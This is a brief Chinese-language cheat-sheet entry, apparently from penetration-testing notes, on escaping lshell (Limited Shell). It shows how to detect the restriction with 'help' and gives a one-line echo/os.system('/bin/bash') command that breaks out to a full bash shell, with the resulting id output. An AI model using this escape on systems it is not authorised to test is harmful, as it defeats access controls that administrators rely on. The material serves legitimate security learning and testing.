## lshell(Limited Shell) escape

lshell是表示当前用户的shell是受限的，只能执行几个指定的指令
可参考[Lshell - aldeid](https://www.aldeid.com/wiki/Lshell)

先确定自己是否被受限
```
user:~$ help
cd  clear  echo  exit  help  ll  lpath  ls
或
user:~$ help help
Limited Shell (lshell) limited help.
```

这里可以执行echo
便可以一句话脱离受限的shell
```
export os.system('/bin/bash')

user@lshell:~$ id
uid=1000(user) gid=1000(user)
```

